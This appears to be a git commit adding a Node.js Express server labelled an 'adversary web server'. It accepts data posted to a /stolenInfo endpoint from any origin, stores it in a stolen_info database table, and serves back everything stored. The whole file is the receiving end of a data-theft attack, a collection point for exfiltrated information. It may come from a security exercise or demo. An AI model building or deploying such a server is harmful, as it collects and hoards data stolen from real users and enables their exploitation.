b49bbe7686867e6612b8153b8500300e27752ba2
Harvir Dhaliwal <harvir.dhaliwal@hotmail.com>
2023-11-18 01:00:22 -0800

    adversary web server

---
+++ adversary_web_app/index.js
@@ -0,0 +1,53 @@
+const express = require('express');
+const app = express();
+const port = 3000
+var connection = require('./database')
+const cors = require('cors');
+
+app.use(cors({
+    origin: '*'
+}));
+app.use(express.json());
+
+app.get('/', (req, res) => {
+    let sql = 'SELECT info FROM STOLEN_INFO'
+    connection.query(sql, (err, result) => {
+        if (err) {
+            throw err
+        }
+        else {
+            console.log(JSON.parse(JSON.stringify(result)))
+            res.send(JSON.parse(JSON.stringify(result)))
+        }
+    })
+  })
+  
+  app.post('/stolenInfo', (req, res) => {
+    console.log(req.body)
+    const info = req.body.stolen_info;
+
+    if (!info) {
+        return res.status(400).send('Bad Request: Missing "info" in the request body');
+    }
+
+    let sql = 'INSERT INTO stolen_info (info) VALUES (?)';
+    connection.query(sql, info, (err, result) => {
+        if (err) {
+            throw err;
+        } else {
+            res.send('Data added successfully');
+        }
+    });
+});
+
+  app.listen(port, () => {
+    console.log(`Example app listening on port ${port}`)
+    connection.connect((err) => {
+        if (err) {
+            throw err
+        }
+        else {
+            console.log('Database connected')
+        }
+    })
+  })
